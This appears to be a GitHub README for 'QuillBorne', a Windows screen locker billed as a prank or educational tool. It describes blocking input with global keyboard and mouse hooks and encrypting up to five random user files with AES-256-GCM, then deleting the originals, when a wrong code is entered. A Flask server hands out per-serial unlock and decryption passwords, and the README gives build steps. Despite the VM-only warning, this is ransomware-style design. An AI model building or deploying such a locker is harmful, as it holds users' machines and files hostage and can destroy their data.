# QuillBorne

**Windows prank / educational system locker** written in modern C++ (WinAPI + GDI+).

Полноэкранное окно поверх всего, низкоуровневые хуки клавиатуры и мыши, фейковый терминал, neofetch с реальными данными системы и мемными сообщениями. Разблокировка только по специальному коду.

> **⚠️ ВАЖНО / WARNING**
>
> Это **шуточный и образовательный** проект.  
> Запускайте **только на виртуальной машине** или в полностью изолированной среде.  
> Программа запрашивает права администратора и устанавливает глобальные низкоуровневые хуки (`WH_KEYBOARD_LL` / `WH_MOUSE_LL`).  
> Автор не несёт ответственности за любые последствия использования на основном компьютере.

## Возможности

- Полноэкранное topmost-окно (`WS_EX_TOPMOST`)
- Блокировка мыши и большинства опасных сочетаний клавиш (Win, Alt+F4, Ctrl+Shift+Esc, Alt+Tab и др.)
- Три фазы загрузки:
  1. **LOADING** — слайдшоу картинок из `assets/` + прогресс-бар
  2. **TERMINAL** — эмуляция командной строки с печатью команд
  3. **LOCKED** — арт + neofetch + поле ввода кода
- **Реальный neofetch**: имя пользователя, имя ПК, версия Windows + build, uptime, разрешение, CPU, память
- Ротация мемных фраз
- При **неверном** коде разблокировки: шифрует до 5 случайных файлов из Desktop / Documents / Downloads (AES-256-GCM), оригиналы удаляются
- Системные файлы, папки, .exe/.dll и т.п. **не трогает**
- Пароль файлов: `13827`
- При **верном** коде: через 10 секунд появляется окно «Хочешь разблокировать свои файлы?»
  - 3 попытки ввести `13827`
  - успех → файлы расшифровываются, `.enc` удаляются
  - провал → окно закрывается, файлы остаются зашифрованными
- Разблокировка самого QuillBorne: SHA-256 хеш пустой строки

**Код разблокировки:**
```
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
```

## Сборка

1. Клонируй репозиторий:
   ```bash
   git clone https://github.com/orientation0/QuillBorne.git
   cd QuillBorne
   ```
2. Открой `QuillBorne.sln` в Visual Studio 2022.
3. Выбери конфигурацию **Release | x64**.
4. Build → Build Solution (`Ctrl+Shift+B`).

Готовый `QuillBorne.exe` появится в `src\x64\Release\` (вместе с `art.png` и папкой `assets`).

## Сервер серийных номеров

Пароли больше не зашиты в exe — клиент при старте обращается к серверу.

| Поле | Назначение |
|------|------------|
| `serial` | `QB-XXXXXXXX` (хранится в `%LOCALAPPDATA%\QuillBorne\serial.txt`) |
| `password_8` | Код разблокировки винлокера |
| `password_6` | Пароль расшифровки файлов |

### Запуск сервера

```bash
cd server
pip install flask
python server.py
```

Сервер слушает `0.0.0.0:5000`.

В `src/main.cpp` поменяй `SERVER_HOST` на IP машины с сервером (сейчас `127.0.0.1`).

### Полезные URL

```
http://SERVER:5000/generate
http://SERVER:5000/register?serial=QB-XXXX
http://SERVER:5000/get/QB-XXXX
http://SERVER:5000/list
```

Если сервер недоступен, используются запасные коды:
- unlock: SHA-256 пустой строки
- files: `13827`
